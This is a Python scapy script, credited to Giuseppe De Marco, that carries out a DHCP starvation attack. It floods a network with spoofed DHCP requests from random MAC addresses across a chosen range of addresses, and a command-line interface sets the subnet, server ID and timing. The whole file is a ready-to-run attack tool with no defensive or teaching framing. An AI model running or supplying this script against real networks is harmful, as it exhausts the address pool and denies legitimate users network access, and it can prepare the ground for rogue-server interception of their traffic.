#!/usr/bin/env python3
# Giuseppe De Marco

from scapy.all import *

def starvit(ip_subnet="192.168.1.",
            start_ip=100,
            end_ip=254,
            server_id="192.168.1.1",
            dst_mac="ff:ff:ff:ff:ff:ff",
            timeout=0.2,
            debug=0):
    # Stops scapy from checking return packet originating from any packet that we have sent out
    conf.checkIPaddr = False    
    for ip in range(start_ip, end_ip):
        bogus_mac_address = RandMAC()
        requested_ip = ip_subnet + str(ip)
        if server_id:
            dhcp_request = Ether(src=bogus_mac_address, dst=dst_mac)\
                           /IP(src="0.0.0.0", dst="255.255.255.255")\
                           /UDP(sport=68, dport=67)\
                           /BOOTP(chaddr=bogus_mac_address)\
                           /DHCP(options=[("message-type","request"),
                                          ("server_id",server_id),
                                          ("requested_addr", requested_ip),
                                          "end"])
        else:
            dhcp_request = Ether(src=bogus_mac_address, dst=dst_mac)\
                           /IP(src="0.0.0.0", dst="255.255.255.255")\
                           /UDP(sport=68, dport=67)\
                           /BOOTP(chaddr=bogus_mac_address)\
                           /DHCP(options=[("message-type","request"),
                                          #("server_id",server_id),
                                          ("requested_addr", requested_ip),
                                          "end"])
        sendp(dhcp_request)
        print("Requesting: " + requested_ip)
        if debug: print('%r'%dhcp_request)
        time.sleep(timeout)

            
if __name__=="__main__":
    import argparse
    parser = argparse.ArgumentParser()
    parser.add_argument('-subnet', required=True, 
                        help="/24 subnet, example: -subnet 192.168.27.")
    
    parser.add_argument('-start',
                        metavar='N',
                        type=int, 
                        help="start ip to request")

    parser.add_argument('-end',
                        metavar='N',
                        type=int, 
                        help="end ip to request")

    parser.add_argument('-server_id', required=False, 
                        help="DHCP server id, example: 192.168.27.254")

    parser.add_argument('-dst_mac', default="ff:ff:ff:ff:ff:ff", required=False, 
                        help="Destination DHCP MAC address, default: ff:ff:ff:ff:ff:ff")

    parser.add_argument('-timeout', type=float, default=0.2, required=False, 
                        help="seconds to wait between a request and another. example -timeout 0.2")

    parser.add_argument('-debug', type=int, default=0,
                        help="print packets", required=False)

    args = parser.parse_args()
    
    # run!
    starvit(ip_subnet=args.subnet,
            start_ip=args.start,
            end_ip=args.end,
            server_id=args.server_id,
            dst_mac=args.dst_mac,
            timeout=args.timeout,
            debug=args.debug)
